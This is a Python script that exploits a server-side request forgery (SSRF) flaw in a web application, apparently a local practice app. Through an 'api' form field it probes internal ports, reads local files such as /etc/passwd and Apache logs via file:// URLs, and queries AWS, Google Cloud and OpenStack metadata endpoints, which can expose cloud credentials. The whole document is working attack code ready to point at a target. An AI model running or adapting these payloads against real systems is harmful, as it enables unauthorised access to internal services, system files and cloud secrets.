import requests

# Target web application URL (replace with your actual target)
target_url = "http://localhost/vuln-app/index.php/"

# List of ports to test for open status
ports = [80, 443, 21, 3306, 22, 8080]

# List of local files to attempt to access via SSRF
local_files = [
    'file:///etc/passwd',
    'file:///var/log/apache2/access.log',
    'file:///var/log/apache2/error.log',
    'file:///etc/apache2/apache2.conf',
    'http://localhost/phpmyadmin'
]

# List of cloud metadata URLs (for example, AWS)
cloud_metadata_urls = [
    'http://169.254.169.254/latest/meta-data/',  # AWS EC2 metadata
    'http://metadata.google.internal/computeMetadata/v1/',  # Google Cloud metadata
    'http://169.254.169.254/openstack/latest/meta_data.json'  # OpenStack metadata
]

# Function to send request and check response
def check_response(url, payload):
    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.status_code == 200:
            if "Raw Data" in response.text or "Data" in response.text:
                print(11111, payload)
                print(f"Successfully exploited SSRF with URL: {payload['api']}")
                # print(response.text)
                return True
        return False
    except requests.RequestException as e:
        print(f"Request failed for {payload['api']}. Error: {e}")
        return False

# Check for open ports
print("Checking for open ports...")
for port in ports:
    payload = {'api': f'http://localhost:{port}'}
    if check_response(target_url, payload):
        print(f"Port {port} might be open!")

# Check for local file access
print("\nChecking for local file access...")
for file_url in local_files:
    payload = {'api': file_url}
    if check_response(target_url, payload):
        print(f"Successfully accessed local file: {file_url}")

# Check for cloud metadata
print("\nChecking for cloud metadata...")
for metadata_url in cloud_metadata_urls:
    payload = {'api': metadata_url}
    if check_response(target_url, payload):
        print(f"Successfully accessed cloud metadata: {metadata_url}")

print("\nFinished testing.")
